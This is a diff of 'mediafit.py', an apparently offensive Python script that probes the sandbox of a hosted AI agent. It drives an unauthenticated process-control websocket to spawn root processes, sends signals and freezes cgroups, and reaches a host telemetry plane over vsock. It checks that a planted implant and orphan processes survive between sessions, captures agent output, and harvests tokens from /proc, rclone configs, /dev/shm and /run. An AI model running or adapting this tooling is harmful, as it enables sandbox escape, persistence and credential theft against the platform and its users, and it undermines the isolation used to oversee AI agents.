@@ -1,16 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-mediafit.py v12.5  --  MEDIAFIT
+mediafit.py v12.6  --  MEDIAFIT
 ===================================================================
-PROVEN: P1 bypass(101) · P2 loopback blocked · P3 no credential
-        P4 PID1 ProcessCreated · P7 host telemetry HTTP 200
-        P8 implant survived · P9 agent output captured · P11 survivor orphans
-v12.5: CONTROL messages carry NO process_id (server: "unknown variant
-       `process_id`, expected one of `SendSignal`, `Kill`, `Expect...`").
-       Create uses the proven shape: memory_limit_bytes/timeout omitted,
-       reattachable=false so the socket owns the process and streams stdout.
-       Survivor orphans are now starttime-filtered (current shell excluded).
+PROVEN: P1 bypass(101) · P2 loopback blocked · P3 no credential · P4 create
+        P6 SignalSent+SIGSTOP(T) · P7 host telemetry 200 · P8 survived
+        P9 agent output · P11 survivor orphan
+v12.6: control messages are always valid JSON dicts (unit variants = null);
+       stdin is tested on a dedicated /bin/cat process, because `sh -c`
+       never reads stdin.
 Stdlib only. RUN TWICE. Output: /mnt/user-data/outputs/mediafit-report.txt
 ===================================================================
 """
@@ -202,7 +200,6 @@ def orphan_report():
     rec("ORPHANS_SURVIVOR=%d" % len(survivors))
     for r in survivors[:6]: rec("SURVIVOR pid=%s start=%s cmd=%s" % r)
     rec("ORPHANS_CURRENT=%d" % len(current))
-    for r in current[:3]: rec("CURRENT pid=%s start=%s cmd=%s" % r)
     rec("ORPHANS_PLATFORM=%d" % len(platform))
 
 def varint(n):
@@ -236,23 +233,19 @@ def phase_auth():
     rec("AUTH_VARIANTS=%s" % r)
     rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))
 
-def ctrl(w, label, forms, wait=1.5):
-    """Control messages carry NO process_id: the socket owns the process."""
-    s, bins = "", []
-    for f in forms:
-        try:
-            w.txt(f if isinstance(f, str) else json.dumps(f))
-            t, bins = w.drain(wait)
-            s = " ".join(t)
-        except Exception as e:
-            rec("%s_EXC=%s" % (label, e)); return "", []
-        rec("%s_TRY=%s" % (label, (s or "no-response")[:110]))
-        if "InfraError" not in s:
-            return s, bins
+def ctrl(w, label, form, wait=1.5):
+    """form is ALWAYS a dict -> json.dumps produces valid JSON. Unit variant = null."""
+    try:
+        w.js(form)
+        t, bins = w.drain(wait)
+        s = " ".join(t)
+    except Exception as e:
+        rec("%s_EXC=%s" % (label, e)); return "", []
+    rec("%s=%s" % (label, (s or "no-response")[:120]))
     return s, bins
 
 def phase_lifecycle():
-    log("PHASE 3  live process: create -> stdout -> stdin -> signal -> freeze -> kill")
+    log("PHASE 3  create -> stdout -> signal -> freeze -> kill")
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
     P = "mfl" + TAG
     w = WS(src=ALIAS)
@@ -260,27 +253,16 @@ def phase_lifecycle():
         "name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
         "clear_env": False, "allow_process_id_reuse": True, "reattachable": False,
         "uid": 0, "gid": 0}})
-    t, bins = w.drain(3.5)
+    t, bins = w.drain(4)
     s = " ".join(t)
-    rec("CREATE_RESP=%s" % s[:190])
+    rec("CREATE_RESP=%s" % s[:170])
     rec("PROCESS_SPAWNED=%s" % ("ProcessCreated" in s))
+    rec("STDOUT_FRAMES=%d" % len(bins))
+    rec("STDOUT_HAS_TICK=%s" % any(b"MF_TICK_" in x for x in bins))
     if "ProcessCreated" not in s:
-        rec("CREATE_FAIL=True"); w.close(); return
-    rec("STDOUT_EARLY_FRAMES=%d" % len(bins))
+        w.close(); return
 
-    _, b2 = ctrl(w, "EXPECT_STDOUT", ["ExpectStdOut", {"ExpectStdOut": None}], 2.0)
-    rec("STDOUT_FRAMES=%d" % len(b2))
-    rec("STDOUT_HAS_TICK=%s" % any(b"MF_TICK_" in x for x in (bins + b2)))
-
-    ctrl(w, "EXPECT_STDIN", ["ExpectStdIn", {"ExpectStdIn": None}], 1.2)
-    try:
-        w.binf(b"echo STDIN_OK_42\n")
-        _, b3 = w.drain(3)
-        rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in x for x in b3))
-    except Exception as e:
-        rec("STDIN_ROUNDTRIP=ERR:%s" % e)
-
-    ctrl(w, "SIGNAL", [{"SendSignal": 19}, "SendSignal"], 2.0)
+    ctrl(w, "SIGNAL", {"SendSignal": 19}, 2.0)
     osp = find_ospid(MARK)
     if osp:
         st = rdo("/proc/%s/stat" % osp).split()
@@ -294,13 +276,36 @@ def phase_lifecycle():
                 wr(fz + "/freezer.state", "THAWED")
             except Exception as e:
                 rec("FREEZER_ERR=%s" % e)
-        rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
-    ctrl(w, "KILL", ["Kill", {"Kill": None}], 1.5)
+        pe = cgdir("pids", cg)
+        rec("PIDS_EVENTS=%s" % (rdo(pe + "/pids.events") or rdo("/sys/fs/cgroup/pids/pids.events", "-")))
+    ctrl(w, "KILL", {"Kill": None}, 1.5)
+    w.close()
+
+@guard("STDIN")
+def phase_stdin():
+    log("PHASE 4  stdin full-duplex on a dedicated reader (/bin/cat)")
+    P = "mfs" + TAG
+    w = WS(src=ALIAS)
+    w.js({"process_id": P, "create_req": {
+        "name": "/bin/cat", "args": [], "env_vars": {}, "clear_env": False,
+        "allow_process_id_reuse": True, "reattachable": False, "uid": 0, "gid": 0}})
+    t, _ = w.drain(2)
+    rec("STDIN_PROC=%s" % " ".join(t)[:120])
+    if "ProcessCreated" not in " ".join(t):
+        w.close(); return
+    ctrl(w, "EXPECT_STDIN", {"ExpectStdIn": None}, 1.2)
+    try:
+        w.binf(b"MEDIAFIT_STDIN_OK_42\n")
+        _, b = w.drain(3)
+        rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in x for x in b))
+    except Exception as e:
+        rec("STDIN_ROUNDTRIP=ERR:%s" % e)
+    ctrl(w, "STDIN_KILL", {"Kill": None}, 1.0)
     w.close()
 
 @guard("HOSTPLANE")
 def phase_hostplane():
-    log("PHASE 4  host telemetry plane")
+    log("PHASE 5  host telemetry plane")
     for label, body in (("protobuf", otlp_body()), ("empty", b"")):
         try:
             s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(5)
@@ -321,7 +326,7 @@ def phase_hostplane():
 
 @guard("CRED")
 def phase_cred():
-    log("PHASE 5  credential inside the sandbox")
+    log("PHASE 6  credential inside the sandbox")
     pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{10,}")
     raw = []
     def add(b):
@@ -339,8 +344,20 @@ def phase_cred():
                 if p in ("--config", "-c") and i + 1 < len(parts):
                     body = rdo(parts[i+1], "")
                     rec("RCLONE_CFG=%s" % parts[i+1])
-                    rec("RCLONE_CFG_BODY=%s" % body[:400].replace("\n", "|"))
                     add(body.encode("latin1", "replace"))
+    for base in ("/dev/shm/rclone-boot", "/dev/shm", "/run"):
+        if not os.path.isdir(base): continue
+        for f in os.listdir(base):
+            fp = os.path.join(base, f)
+            try:
+                if not os.path.isfile(fp) or os.path.getsize(fp) > 300000: continue
+            except Exception: continue
+            body = rdo(fp, "")
+            if body:
+                rec("TOKENFILE=%s" % fp)
+                add(body.encode("latin1", "replace"))
+                for m in re.finditer(r'"(?:access_token|token|id_token)"\s*:\s*"([^"]{10,})"', body):
+                    rec("TOKENFIELD=%s" % m.group(1)[:50])
     budget = 24 << 20
     for d in sorted(os.listdir("/proc")):
         if not d.isdigit() or budget <= 0 or len(raw) >= 6: continue
@@ -422,16 +439,16 @@ def proof():
     rec("P3_NO_CREDENTIAL_ENFORCED=%s" % any_(lambda l: l == "AUTH_IDENTICAL=True"))
     rec("P4_PID1_SPAWNED_PROCESS=%s" % any_(lambda l: l == "PROCESS_SPAWNED=True"))
     rec("P5_STDIN_FULL_DUPLEX=%s" % any_(lambda l: l == "STDIN_ROUNDTRIP=True"))
-    rec("P6_SIGNAL_ACCEPTED=%s" % any_(lambda l: l.startswith("SIGNAL_TRY=") and "SignalSent" in l))
+    rec("P6_SIGNAL_ACCEPTED=%s" % any_(lambda l: l.startswith("SIGNAL=") and "SignalSent" in l))
     rec("P7_HOST_PLANE_200=%s" % any_(lambda l: l.startswith("VSOCK_5005") and "HTTP/1.1 200" in l))
     rec("P8_IMPLANT_SURVIVED=%s" % any_(lambda l: l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True"))
     rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any_(lambda l: l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0"))
     rec("P11_SURVIVOR_ORPHANS=%s" % any_(lambda l: l.startswith("ORPHANS_SURVIVOR=") and l.split("=")[1] != "0"))
 
 def main():
-    log("MEDIAFIT v12.5")
-    rec("=== MEDIAFIT v12.5 ===")
-    phase_bypass(); phase_auth(); phase_lifecycle()
+    log("MEDIAFIT v12.6")
+    rec("=== MEDIAFIT v12.6 ===")
+    phase_bypass(); phase_auth(); phase_lifecycle(); phase_stdin()
     phase_hostplane(); phase_cred(); phase_implant(); phase_info(); proof()
     os.makedirs(os.path.dirname(OUT), exist_ok=True)
     wr(OUT, "\n".join(R) + "\n")
